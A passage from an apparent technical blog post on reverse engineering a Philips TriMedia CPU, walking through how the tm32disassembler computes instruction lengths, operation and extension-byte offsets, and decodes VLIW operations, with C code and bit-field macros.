class=\"k\">break</span><span class=\"p\">;</span>\n                <span class=\"k\">case</span> <span class=\"mi\">3</span>  <span class=\"o\">:</span>   <span class=\"k\">break</span><span class=\"p\">;</span>      <span class=\"c1\">// 0-bit operation (NOP)</span>\n                <span class=\"k\">default</span>   <span class=\"o\">:</span> <span class=\"n\">fprintf</span><span class=\"p\">(</span><span class=\"n\">stderr</span><span class=\"p\">,</span> <span class=\"s\">\"encoding error  (* -1 bits *)</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span>\n                                        <span class=\"k\">return</span> <span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n                <span class=\"p\">}</span>\n        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"n\">instrcount</span> <span class=\"o\">&gt;</span><span class=\"mi\">3</span><span class=\"p\">)</span>\n                <span class=\"n\">len</span> <span class=\"o\">+=</span> <span class=\"mi\">8</span><span class=\"p\">;</span>       <span class=\"c1\">// add eight bits for the format field of the 2nd group</span>\n        <span class=\"k\">return</span> <span class=\"n\">len</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</pre> \n  </div> \n  <p>Please, note that until now, we didn't bother to talk about the bytes in the binary and we don't actually need the instruction length to strictly disassemble the instruction. However, we need it to calculate the amount of bytes we have to get from the binary.</p> \n </div> \n <div class=\"section\" id=\"step-2-get-the-operation-size\"> \n  <h3>Step 2 - Get the operation size</h3> \n  <p>Getting the size of each operation is really simple. If you put attention to the previous step, you'd have noted that we have fixed sizes for operations (26, 34 and 42 bit operations). This information is provided, again, by the format bits, so the only thing we need to do is to read the bit fields corresponding to the current operation. Simple as that.</p> \n  <p>From Step 1, we know that all the operations inside the instruction are 42 bits long thus we'll have 2 extension bytes. We need to get the offset of those extension bytes and the bytes representing the operation itself with the parameters. This is what we are going to see in the next step.</p> \n  <div class=\"section\" id=\"what-happens-when-processing-the-beginning-of-our-byte-stream\"> \n   <h4>What happens when processing the beginning of our byte stream?</h4> \n   <p>As our first instruction has a 224 bits length (28 bytes), our bytes are the following:</p> \n   <pre class=\"literal-block\">\n7C 47 81 43 60 21 60 A0 85 50 80 30 03 C1 08 00 40 E0 60 45 60 11 40 0F 80 00 57 01\n</pre> \n   <p>Remember that the first bytes are used as format bits for the next instruction and not for the one we are processing.</p> \n   <p>It means that <tt class=\"docutils literal\">0x7C47</tt> are the two bytes we have to analyze in order to known how long the next instruction is. In this case, by doing the previous analysis, we can conclude that the next instruction is 72 bits long:</p> \n   <pre class=\"literal-block\">\nformat bytes 0x7C47 -&gt; swap_bytes(0x7C47) -&gt; 0x477C -&gt; binary form -&gt; ‭‭01 00 01 11 01 11 11 00‬\n                                                                               ^^ ^^ ^^ ^^ ^^\n</pre> \n   <p>Read it from right to left, the result is:</p> \n   <ul class=\"simple\"> \n    <li>00: operation size is 26 bits;</li> \n    <li>11: no operation, size = 0 bits;</li> \n    <li>11: no operation, size = 0 bits;</li> \n    <li>10: operation size is 34 bits;</li> \n    <li>11: no operation, size = 0 bits.</li> \n   </ul> \n   <p>The result is calculated as follows: 16 bits (format bytes) + 24 bits (1st op size - 2 bits) + 32 bits (2nd op size - 2 bits) = 72 bits = 9 bytes</p> \n  </div> \n  <div class=\"section\" id=\"a-note-about-extension-bytes-when-calculating-the-size-of-an-operation\"> \n   <h4>A note about extension bytes when calculating the size of an operation</h4> \n   <p>One last thing, in the second part of the series, I mentioned that <em>extension bytes</em> can be added to the operation in order to extend it. The number of bytes can be 0, 1 or 2, depending on the format bits. In the case of 26 bits operations, we have a 24-bits part plus 2 format bits. In the case of 34 bits operations, we have a 24-bits part, plus 2 format bits and 1 byte extension. In the case of 42 bits operations we have a 24-bits part, plus 2 format bits and 2 byte extensions. This is important when calculating the offset of the real operation inside the stream of the current instruction.</p> \n   <p>The following picture tries to show you how each operation is decomposed:</p> \n   <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-01-16_reversing-trimedia-part-3/operations.png\" style=\"width: 400px;\" /> \n   <p>In the picture, format bits are shown next to the operation and extension bytes but this is not always the case. Don't think you are going to find it like that, in fact, you have to calculate those offsets to get the bytes from the stream.</p> \n   <p>If you are curious, you can take a look at the <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32funcs.c#L50\">operationsize</a> function in the <tt class=\"docutils literal\">tm32disassembler</tt>.</p> \n  </div> \n </div> \n <div class=\"section\" id=\"step-3-unpack-the-operation\"> \n  <h3>Step 3 - Unpack the operation</h3> \n  <p>So far we have the following information:</p> \n  <ol class=\"arabic simple\"> \n   <li>the instruction length;</li> \n   <li>the size of each operation inside the instruction.</li> \n  </ol> \n  <p>To continue disassembling the instruction, we need to know the offset of each operation inside the bit stream and, when relevant, the offset of the extension bytes.</p> \n  <p>For a better explanation, I'll use part of the code of <tt class=\"docutils literal\">tm32disassembler</tt> to show you how both offsets are calculated.</p> \n  <div class=\"section\" id=\"get-the-offset-of-an-operation\"> \n   <h4>Get the offset of an operation</h4> \n   <p>The <em>operation offset</em> is the one that will tell us where each operation is located in the bit stream. Please, <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32funcs.c#L196\">take a look at the following code</a>:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"kt\">uint16_t</span> <span class=\"nf\">operationoffset</span><span class=\"p\">(</span><span class=\"kt\">uint16_t</span> <span class=\"n\">formatbits</span><span class=\"p\">,</span> <span class=\"kt\">uint8_t</span> <span class=\"n\">slotnumber</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"kt\">uint16_t</span> <span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"n\">offset</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">oplen</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">opcount</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n\n        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">operationsize</span><span class=\"p\">(</span><span class=\"n\">formatbits</span><span class=\"p\">,</span> <span class=\"n\">slotnumber</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"c1\">// a NOP in slotnumber, so operation size for that is zero</span>\n                <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n\n        <span class=\"k\">for</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">slotnumber</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                <span class=\"n\">oplen</span> <span class=\"o\">=</span> <span class=\"n\">operationsize</span><span class=\"p\">(</span><span class=\"n\">formatbits</span><span class=\"p\">,</span> <span class=\"n\">i</span><span class=\"p\">);</span>\n                <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"n\">oplen</span><span class=\"o\">&gt;</span><span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                        <span class=\"n\">opcount</span><span class=\"o\">++</span><span class=\"p\">;</span>\n                        <span class=\"n\">offset</span><span class=\"o\">+=</span><span class=\"mi\">24</span><span class=\"p\">;</span>\n                <span class=\"p\">}</span>\n        <span class=\"p\">}</span>\n        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"n\">opcount</span> <span class=\"o\">&gt;</span> <span class=\"mi\">2</span><span class=\"p\">)</span>\n                <span class=\"n\">offset</span><span class=\"o\">+=</span><span class=\"mi\">8</span><span class=\"p\">;</span>          <span class=\"c1\">// add the formatbits byte for the 2nd operations group, if used</span>\n\n        <span class=\"k\">return</span> <span class=\"n\">offset</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</pre> \n   </div> \n   <p>As you can see, we only need the format bits and the slot number of the operation in order to calculate the offset. If our instruction contains a NOP, the offset for that operation in slot number <tt class=\"docutils literal\">i</tt> is 0.</p> \n   <p>It's important to note that the offset is calculated from the beginning of the instruction. Then, we need to count how many operations are inside our instruction till the slot number of the current operation and go adding up to 24 bits. Why 24 bits? That's the smallest operation size we can have (format bits are not taken into account). In other cases, we have extension bytes and our instruction is either 34 or 42 bits. Last but not least, we have to take into account if the operation is part of the second group of operations, and in that case, we need to add 8 more bits.</p> \n   <p>Now, let's go back to our instruction bytes:</p> \n   <pre class=\"literal-block\">\n7C 47 81 43 60 21 60 A0 85 50 80 30 03 C1 08 00 40 E0 60 45 60 11 40 0F 80 00 57 01\n</pre> \n   <p>If we follow the above algorithm to calculate the offset for the first operation, we get the following result:</p> \n   <p>We know that the format bits for the instruction are 0x02AA, the slot number for the first operation is 0 and its format bits are <tt class=\"docutils literal\">01</tt>. This means that <tt class=\"docutils literal\">offset</tt> is 0, basically, because the condition <tt class=\"docutils literal\">i &lt; slotnumber</tt> is not satisfied, <tt class=\"docutils literal\">i</tt> and <tt class=\"docutils literal\">slotnumber</tt> are both 0. The second operation <tt class=\"docutils literal\">offset</tt> will be 24, the third one will be 48, the fourth one will be ... 80 and the fifth will be ... 104. Were you expecting 96 for the fourth and 192 for the fifth? :P No, both operations belong to the second group of operations so we need to add 8 bits.</p> \n   <p>As our first operation is 40 bits long, and knowing that we have 16 bits at the beginning of the stream for the format bytes, we know that our bit stream is going to be, at most, as long as:</p> \n   <pre class=\"literal-block\">\n7c 47       - 81 43 60 21 60\n^^ ^^         ^^ ^^ ^^ ^^ ^^\n(fb n ins)  -   (op bytes)\n</pre> \n   <ul class=\"simple\"> \n    <li>(fb n ins): format bytes for the next instruction;</li> \n    <li>(op bytes): bytes for the first operation.</li> \n   </ul> \n   <p>We have what are supposed to be the bytes corresponding to our first operation but we need to remember that a 42 bit operation is composed of a 24 bits part, plus 2 bits for the format bits and a 2 bytes extension. It means these 5 bytes don't belong <strong>ONLY</strong> to our first operation. We'll see that the bytes of an operation, in this case with 42 bits, are scattered throughout the whole byte stream and, in fact, those five bytes contain part of the second operation. Anyway, we need to know where our extension bytes are in order to get the final bytes for our first operation.</p> \n  </div> \n  <div class=\"section\" id=\"get-the-offset-of-the-extension-bytes\"> \n   <h4>Get the offset of the extension bytes</h4> \n   <p>As in the previous step, I'm going to show you the code of how the extension bytes offset is calculated and then I'll finish by getting the bytes for the first operation in our first instruction.</p> \n   <p>The code to get the extension bytes of an operation <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32funcs.c#L219\">is the following</a>:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"mi\">219</span> <span class=\"kt\">uint16_t</span> <span class=\"nf\">extensionoffset</span><span class=\"p\">(</span><span class=\"kt\">uint16_t</span> <span class=\"n\">formatbits</span><span class=\"p\">,</span> <span class=\"kt\">uint8_t</span> <span class=\"n\">slotnumber</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n<span class=\"mi\">220</span>    <span class=\"kt\">uint32_t</span> <span class=\"n\">i</span><span class=\"p\">;</span>\n<span class=\"mi\">221</span>    <span class=\"kt\">uint16_t</span> <span class=\"n\">extbegin</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">extoffset</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">oplen</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">opcount</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"mi\">222</span>\n<span class=\"mi\">223</span>    <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"n\">operationsize</span><span class=\"p\">(</span><span class=\"n\">formatbits</span><span class=\"p\">,</span><span class=\"n\">slotnumber</span><span class=\"p\">)</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">24</span><span class=\"p\">)</span>      <span class=\"c1\">// operation has no extension</span>\n<span class=\"mi\">224</span>        <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"mi\">225</span>\n<span class=\"mi\">226</span>    <span class=\"k\">for</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">MAXSLOT</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"c1\">// count the number of non-NOP operations in the instruction.</span>\n<span class=\"mi\">227</span>        <span class=\"n\">oplen</span> <span class=\"o\">=</span> <span class=\"n\">operationsize</span><span class=\"p\">(</span><span class=\"n\">formatbits</span><span class=\"p\">,</span> <span class=\"n\">i</span><span class=\"p\">);</span> <span class=\"c1\">// (count * 24) + format bytes is a pointer to the extension bytes</span>\n<span class=\"mi\">228</span>        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"n\">oplen</span><span class=\"o\">&gt;</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n<span class=\"mi\">229</span>            <span class=\"n\">opcount</span><span class=\"o\">++</span><span class=\"p\">;</span>\n<span class=\"mi\">230</span>    <span class=\"p\">}</span>\n<span class=\"mi\">231</span>    <span class=\"n\">extbegin</span><span class=\"o\">+=</span><span class=\"p\">(</span><span class=\"n\">opcount</span><span class=\"o\">*</span><span class=\"mi\">24</span><span class=\"p\">);</span>\n<span class=\"mi\">232</span>\n<span class=\"mi\">233</span>    <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"n\">opcount</span> <span class=\"o\">&gt;</span><span class=\"mi\">3</span><span class=\"p\">)</span> <span class=\"c1\">//</span>\n<span class=\"mi\">234</span>        <span class=\"n\">extbegin</span><span class=\"o\">+=</span><span class=\"mi\">8</span><span class=\"p\">;</span> <span class=\"c1\">// add format byte to ext. offset for 2nd operations group, if used</span>\n<span class=\"mi\">235</span>\n<span class=\"mi\">236</span>    <span class=\"n\">extoffset</span> <span class=\"o\">=</span> <span class=\"n\">extbegin</span><span class=\"p\">;</span>\n<span class=\"mi\">237</span>\n<span class=\"mi\">238</span>    <span class=\"k\">for</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">slotnumber</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n<span class=\"mi\">239</span>        <span class=\"n\">oplen</span> <span class=\"o\">=</span> <span class=\"n\">operationsize</span><span class=\"p\">(</span><span class=\"n\">formatbits</span><span class=\"p\">,</span> <span class=\"n\">i</span><span class=\"p\">);</span>\n<span class=\"mi\">240</span>        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"n\">oplen</span><span class=\"o\">&gt;</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n<span class=\"mi\">241</span>            <span class=\"n\">extoffset</span><span class=\"o\">+=</span> <span class=\"n\">oplen</span> <span class=\"o\">-</span> <span class=\"mi\">24</span><span class=\"p\">;</span>\n<span class=\"mi\">242</span>    <span class=\"p\">}</span>\n<span class=\"mi\">243</span>    <span class=\"k\">return</span> <span class=\"n\">extoffset</span><span class=\"p\">;</span>\n<span class=\"mi\">244</span> <span class=\"p\">}</span>\n</pre> \n   </div> \n   <p>As you can see, the beginning of the code is very similar to the one in the <tt class=\"docutils literal\">operationoffset</tt> function. The first thing it does is to check if the operation is a NOP, if that is the case, it doesn't have extension bytes.</p> \n   <p>If you remember <a class=\"reference external\" href=\"https://blog.quarkslab.com/resources/2019-01-21_reversing-trimedia-part-2/instruction_format_3.png\">the graph I used in the second part of the series about TriMedia to explain the instruction format with 4 and 5 operations</a>, you see that extension bytes are located at the end of the instruction. In order to get them, the algorithm starts by counting how many operations there are inside the instruction at line <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32funcs.c#L226\">#226</a> and then calculates the start offset of the extension bytes at line <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32funcs.c#L231\">#231</a>. Again, if we have more than 3 operations in an instruction, we must add 8 bits for the format bits of the second group, this is done at line <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32funcs.c#L233\">#233</a>. From line <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32funcs.c#L238\">#238</a> onwards, it calculates the right offset for the extension byte of the current instruction, taking <tt class=\"docutils literal\">extbegin</tt> as the start.</p> \n   <p>In our case, <tt class=\"docutils literal\">opcount</tt> is 5 so <tt class=\"docutils literal\">extbegin</tt> is 120 (24*5) at line <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32funcs.c#L231\">#231</a>, then we have to add 8 because we have more than 3 operations thus <tt class=\"docutils literal\">extoffset</tt> will end up being 128. The comparison at line <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32funcs.c#L238\">#238</a> is not satified (false) becase <tt class=\"docutils literal\">slotnumber</tt> is 0. At this point, we can also calculate the value for the next 4 operations:</p> \n   <ul class=\"simple\"> \n    <li>operation 1: <tt class=\"docutils literal\">extoffset</tt> is 128;</li> \n    <li>operation 2: <tt class=\"docutils literal\">extoffset</tt> is 144;</li> \n    <li>operation 3: <tt class=\"docutils literal\">extoffset</tt> is 160;</li> \n    <li>operation 4: <tt class=\"docutils literal\">extoffset</tt> is 176;</li> \n    <li>operation 5: <tt class=\"docutils literal\">extoffset</tt> is 192.</li> \n   </ul> \n   <p><tt class=\"docutils literal\">extoffset</tt> is the bit offset from the start of the instruction. If we want to know which byte this bit offset corresponds to, we have to skip the first 16 bits of the format bytes and divide it by 8 (because each byte is composed of 8 bits). The values of <tt class=\"docutils literal\">extoffset</tt> for the five operations in our first instruction (in bytes) are the following. Note that as we have only 42 bits operations, we have 2 extension bytes:</p> \n   <ul class=\"simple\"> \n    <li>operation 1: bit offset 128 --&gt; byte offset 18;</li> \n    <li>operation 2: bit offset 144 --&gt; byte offset 20;</li> \n    <li>operation 3: bit offset 160 --&gt; byte offset 22;</li> \n    <li>operation 4: bit offset 176 --&gt; byte offset 24;</li> \n    <li>operation 5: bit offset 192 --&gt; byte offset 26.</li> \n   </ul> \n   <p>Knowing that, it means that the bytes corresponding to our <em>extension bytes</em> for our operations are the following:</p> \n   <pre class=\"literal-block\">\n7C 47 81 43 60 21 60 A0 85 50 80 30 03 C1 08 00 40 E0 60 45 60 11 40 0F 80 00 57 01\n^^                                                    ^^ ^^ ^^ ^^ ^^ ^^ ^^ ^^ ^^ ^^\noffset no. 0                                          extension bytes starting at offset 18\n</pre> \n   <p>The extension bytes for each operation are the following:</p> \n   <ul class=\"simple\"> \n    <li>extension bytes for operation no. 1: 60 45;</li> \n    <li>extension bytes for operation no. 2: 60 11;</li> \n    <li>extension bytes for operation no. 3: 40 0F;</li> \n    <li>extension bytes for operation no. 4: 80 00;</li> \n    <li>extension bytes for operation no. 5: 57 01.</li> \n   </ul> \n   <p>One last thing, I said that these <em>extension bytes</em> are used to extend the basic 24 bits operations to 34 and 42 bits operations, right? But to be more precise, these extension bytes contain different types of information depending on the type of operation. For example, in a 42 bit operation, they give information about parameters, sign and latency of the operation. The type of data may vary depending on whether the operation is unary, binary, whether it returns some result or not, etc.</p> \n   <p>Now that we know the place where the extension bytes are, we can continue with the last operation needed to disassemble a Philips TriMedia instruction. The decoding operation is not complex but many decisions have to be made in order to decode the actual bytes. The input for the decode operation is a byte array containing the operation bytes calculated by the <tt class=\"docutils literal\">unpack</tt> operation.</p> \n  </div> \n </div> \n <div class=\"section\" id=\"step-4-decode-operation\"> \n  <h3>Step 4 - Decode operation</h3> \n  <p>The work of the <tt class=\"docutils literal\">decode</tt> operation is to get the byte array returned by the <tt class=\"docutils literal\">unpack</tt> operation and parse the bit fields which hold the operation code, operands, parameters, predicates, etc. I won't show each single case for each single operation type because it makes no sense to go through all of them but I'll use the first operation to show you some of the basic cases you can find. This will give you a basic idea of the whole process and if you are interested in the other cases, you'll just need to look at the code of the disassembler or the datasheet/<a class=\"reference external\" href=\"https://github.com/crackinglandia/trimedia/blob/master/asm/US_PATENT_5787302_Software_for_producing_VLIW_instruction_compression.pdf\">US Patent mentioned in the posts</a>.</p> \n  <p>Please, remember the following considerations about a TriMedia operation:</p> \n  <ul class=\"simple\"> \n   <li>the length of each instruction varies depending on the size of each operation;</li> \n   <li>operations: \n    <ul> \n     <li>size can be 26, 34 or 42 bits;</li> \n     <li>can be guarded or unguarded;</li> \n     <li>can be zeroary, unary or binary (0, 1 or 2 operands);</li> \n     <li>can be resultless;</li> \n     <li>may contain immediate parameters (7 or 32 bits);</li> \n     <li>are all compressed except for the branch op.</li> \n    </ul> </li> \n  </ul> \n  <p>Each item mentioned above is configured by a bit or set of bits that are located at specific offsets of the operation bytes. Basically, we'll need to do a lot of shifting and bit masking in order to get the specific bit field. As I said before, we are going to see just an example but if you want more details about the position of each bit on each type of operation, please, take a look at the following documents <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html#id12\" id=\"id7\">[1]</a> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html#id13\" id=\"id8\">[2]</a>.</p> \n  <p>One thing I didn't mention about the <tt class=\"docutils literal\">unpack</tt> operation part is that the format bits and the extension bytes for the current operation (in case of a 34 or 42 bits operation) are packed in the same byte array. The author of the <tt class=\"docutils literal\">tm32disassembler</tt> uses a 64 bit unsigned integer (<a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32unpack.c#L135\">opint64</a>) to pack all the operation data and simplify the bitwise operations. This is more of an implementation detail and doesn't modify the explanation, but I mention it because I spent some time figuring out the details between the specs and the specific implementation in the <tt class=\"docutils literal\">tm32disassembler</tt>.</p> \n  <p>Before continuing with our practical example, I would like to show you some snippets of code from the <tt class=\"docutils literal\">tm32disassembler</tt> in order for you to have an idea on how the decoding is done. As I said, there are many cases to consider so we will have a lot of <tt class=\"docutils literal\"><span class=\"pre\">switch..case</span></tt> sentences with <tt class=\"docutils literal\"><span class=\"pre\">if..else</span></tt> in between. Just to give you an idea, the code should look like this:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"kt\">uint64_t</span> <span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"n\">unpacked_bytestream</span><span class=\"p\">,</span> <span class=\"n\">operation_size</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n\n        <span class=\"k\">switch</span> <span class=\"p\">(</span><span class=\"n\">operation_size</span><span class=\"p\">)</span>\n        <span class=\"p\">{</span>\n                <span class=\"k\">case</span> <span class=\"mi\">24</span><span class=\"o\">:</span>\n                        <span class=\"k\">switch</span><span class=\"p\">(</span><span class=\"n\">decode_bits</span><span class=\"p\">(</span><span class=\"n\">unpacked_bytestream</span><span class=\"p\">))</span>\n                        <span class=\"p\">{</span>\n                                <span class=\"k\">case</span> <span class=\"mi\">1</span><span class=\"o\">:</span> <span class=\"k\">break</span><span class=\"p\">;</span>\n                                <span class=\"k\">case</span> <span class=\"nl\">n</span><span class=\"p\">:</span> <span class=\"k\">break</span><span class=\"p\">;</span>\n                                <span class=\"k\">default</span><span class=\"o\">:</span> <span class=\"k\">break</span><span class=\"p\">;</span>\n                        <span class=\"p\">}</span>\n                        <span class=\"k\">break</span><span class=\"p\">;</span>\n                <span class=\"k\">case</span> <span class=\"mi\">32</span><span class=\"o\">:</span>\n                        <span class=\"k\">switch</span><span class=\"p\">(</span><span class=\"n\">decode_bits</span><span class=\"p\">(</span><span class=\"n\">unpacked_bytestream</span><span class=\"p\">))</span>\n                        <span class=\"p\">{</span>\n                                <span class=\"k\">case</span> <span class=\"mi\">1</span><span class=\"o\">:</span> <span class=\"k\">break</span><span class=\"p\">;</span>\n                                <span class=\"k\">case</span> <span class=\"nl\">n</span><span class=\"p\">:</span> <span class=\"k\">break</span><span class=\"p\">;</span>\n                                <span class=\"k\">default</span><span class=\"o\">:</span> <span class=\"k\">break</span><span class=\"p\">;</span>\n                        <span class=\"p\">}</span>\n                        <span class=\"k\">break</span><span class=\"p\">;</span>\n                <span class=\"k\">case</span> <span class=\"mi\">40</span><span class=\"o\">:</span>\n                        <span class=\"k\">switch</span><span class=\"p\">(</span><span class=\"n\">decode_bits</span><span class=\"p\">(</span><span class=\"n\">unpacked_bytestream</span><span class=\"p\">))</span>\n                        <span class=\"p\">{</span>\n                                <span class=\"k\">case</span> <span class=\"mi\">1</span><span class=\"o\">:</span> <span class=\"k\">break</span><span class=\"p\">;</span>\n                                <span class=\"k\">case</span> <span class=\"nl\">n</span><span class=\"p\">:</span> <span class=\"k\">break</span><span class=\"p\">;</span>\n                                <span class=\"k\">default</span><span class=\"o\">:</span> <span class=\"k\">break</span><span class=\"p\">;</span>\n                        <span class=\"p\">}</span>\n                        <span class=\"k\">break</span><span class=\"p\">;</span>\n                <span class=\"k\">default</span><span class=\"o\">:</span> <span class=\"k\">break</span><span class=\"p\">;</span>\n\n        <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</pre> \n  </div> \n  <p>For example, the <tt class=\"docutils literal\">iadd</tt> operation takes two parameters, it sums them, produces a result and stores it in another parameter. What can we say about the <tt class=\"docutils literal\">iadd</tt> operation then?</p> \n  <blockquote> \n   <ul class=\"simple\"> \n    <li>it's a binary operation;</li> \n    <li>it has a result;</li> \n    <li>operands can be signed or unsigned;</li> \n    <li>it can be guarded.</li> \n   </ul> \n  </blockquote> \n  <p>But we have a variation for this operation, the <tt class=\"docutils literal\">iaddi</tt> operation. The <tt class=\"docutils literal\">iaddi</tt> operation is similar to the <tt class=\"docutils literal\">iadd</tt> but it only takes one operand and an immediate value with 7 bits. All this means that if we want to decode an operation we need to take a look at the instruction set in order to know what type of properties it has.</p> \n  <p>Regarding what I said previously about shifting bits to get the operation properties, the following are the C macros that the <tt class=\"docutils literal\">tm32disassembler</tt> uses:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"cp\">#define OPBITS6_0(x)    (uint32_t)(x &amp; 0x7f)            </span><span class=\"c1\">//   src1[6:0]   | param[13:7]</span>\n<span class=\"cp\">#define OPBITS13_7(x)   (uint32_t)((x &gt;&gt; 7) &amp; 0x7f)     </span><span class=\"c1\">//   src2[6:0]   | param[6:0]   | dst[6:0]</span>\n<span class=\"cp\">#define OPBITS20_14(x)  (uint32_t)((x &gt;&gt; 14) &amp; 0x7f)    </span><span class=\"c1\">//   dst[6:0]    | param[6:0]   | guard[6:0] | dst[6:0]</span>\n<span class=\"cp\">#define OPBITS23_21(x)  (uint32_t)((x &gt;&gt; 21) &amp; 7)       </span><span class=\"c1\">//   opcode[2:0] | param[16:14]</span>\n<span class=\"cp\">#define OPBITS25_24(x)  (uint32_t)((x &gt;&gt; 24) &amp; 3)       </span><span class=\"c1\">//   opcode[4:3] | param[18:17]</span>\n<span class=\"cp\">#define OPBITS25_21(x)  (uint32_t)((x &gt;&gt; 21) &amp; 0x1f)    </span><span class=\"c1\">//   opcode[4:0]</span>\n<span class=\"cp\">#define OPBITS28_26(x)  (uint32_t)((x &gt;&gt; 26) &amp; 7)       </span><span class=\"c1\">//   opcode[7:5]</span>\n<span class=\"cp\">#define OPBITS28_21(x)  (uint32_t)((x &gt;&gt; 21) &amp; 0xff)    </span><span class=\"c1\">//   opcode[7:0]</span>\n<span class=\"cp\">#define OPBITS30_21(x)  (uint32_t)((x &gt;&gt; 21) &amp; 0x3ff)   </span><span class=\"c1\">//   param[23:14]</span>\n<span class=\"cp\">#define OPBITS30_26(x)  (uint32_t)((x &gt;&gt; 26) &amp; 0x1f)    </span><span class=\"c1\">//   param[23:19]</span>\n<span class=\"cp\">#define OPBITS32_26(x)  (uint32_t)((x &gt;&gt; 26) &amp; 0x7f)    </span><span class=\"c1\">//   dst[6:0]    | param[6:0]</span>\n<span class=\"cp\">#define OPBITS33_26(x)  (uint32_t)((x &gt;&gt; 26) &amp; 0x1f)    </span><span class=\"c1\">//   param[23:19]</span>\n<span class=\"cp\">#define OPBITS41_34(x)  (uint32_t)((x &gt;&gt; 34) &amp; 0xff)    </span><span class=\"c1\">//   param[31:24]</span>\n<span class=\"cp\">#define OPBITS41_35(x)  (uint32_t)((x &gt;&gt; 35) &amp; 0x7f)    </span><span class=\"c1\">//   param[6:0]  | dst[6:0]</span>\n<span class=\"cp\">#define OPBITS41_26(x)  (uint32_t)((x &gt;&gt; 26) &amp; 0xffff)  </span><span class=\"c1\">//   both extension bytes</span>\n\n<span class=\"cp\">#define OPBITS33(x)     (uint32_t)((x &gt;&gt; 33) &amp; 1)       </span><span class=\"c1\">//   used to encode type for 42-bit operations</span>\n<span class=\"cp\">#define OPBITS32(x)     (uint32_t)((x &gt;&gt; 32) &amp; 1)       </span><span class=\"c1\">//</span>\n<span class=\"cp\">#define OPBITS31(x)     (uint32_t)((x &gt;&gt; 31) &amp; 1)       </span><span class=\"c1\">//</span>\n<span class=\"cp\">#define OPBITS32_31(x)  (uint32_t)((x &gt;&gt; 31) &amp; 3)       </span><span class=\"c1\">//</span>\n<span class=\"cp\">#define OPBITS29(x)     (uint32_t)((x &gt;&gt; 29) &amp; 1)       </span><span class=\"c1\">//   sign flag for 7-bit parameteric operations</span>\n\n<span class=\"cp\">#define PARAM32BITS(x)  (uint32_t)(((x&gt;&gt;7) &amp; 0x7f) | ((x&lt;&lt;7) &amp; 0x7f&lt;&lt;7) | 